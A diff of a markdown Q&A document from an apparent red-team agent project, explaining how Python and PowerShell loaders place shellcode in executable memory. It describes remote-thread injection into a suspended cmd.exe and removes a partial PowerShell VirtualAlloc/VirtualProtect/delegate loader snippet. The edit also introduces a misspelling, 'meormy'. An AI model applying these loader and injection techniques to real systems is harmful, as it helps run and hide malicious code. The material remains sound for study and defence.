@@ -1,6 +1,6 @@
 # 15 - Loaders (Python and PowerShell)
 
-How shellcode gets loaded into memory and executed. The agent binary is just raw bytes — it needs something to put it in executable memory and jump to it.
+How shellcode gets loaded into memory and executed. The agent binary is just raw bytes — it needs something to put it in executable meormy and jump to it.
 
 ---
 
@@ -65,42 +65,6 @@ CreateRemoteThread(process.handle, remote_addr)
 ```
 The shellcode ends up running inside cmd.exe's process space. The suspended process never actually executes cmd.exe — it's just a container for the shellcode. Running under cmd.exe's identity rather than the loader's is the whole point.
 
----
-
-### How does the PowerShell loader work?
-**File:** `loaders/windows/powershell/loader.ps1` **Line(s):** 44-74
-**Type:** QUESTION
-**Priority:** MEDIUM
-
-PowerShell can't call Win32 APIs natively, so it uses P/Invoke through C# Add-Type:
-```powershell
-# 1. Define Win32 function signatures via C# Add-Type
-Add-Type @"
-  [DllImport("kernel32.dll")]
-  public static extern IntPtr VirtualAlloc(IntPtr addr, uint size, ...);
-  [DllImport("kernel32.dll")]
-  public static extern bool VirtualProtect(IntPtr addr, uint size, ...);
-"@
-
-# 2. Allocate RW memory
-$addr = [Win32]::VirtualAlloc(0, $shellcode.Length, 0x3000, 0x04)
-#                                                    ^MEM_COMMIT|RESERVE  ^PAGE_READWRITE
-
-# 3. Copy shellcode
-[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $len)
-
-# 4. Switch to RX
-[Win32]::VirtualProtect($addr, $len, 0x20, [ref]$old)
-#                                    ^PAGE_EXECUTE_READ
-
-# 5. Cast to delegate and invoke
-$func = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-    $addr, [type][PayloadEntry])
-$func.Invoke()
-```
-Same W^X pattern as the Python loader — never writable and executable at the same time. Architecture gets auto-detected from the PROCESSOR_ARCHITECTURE environment variable.
-
----
 
 ### What is the difference between in-process and injected execution?
 **File:** `loaders/python/README.md` **Line(s):** (POSIX vs Windows)
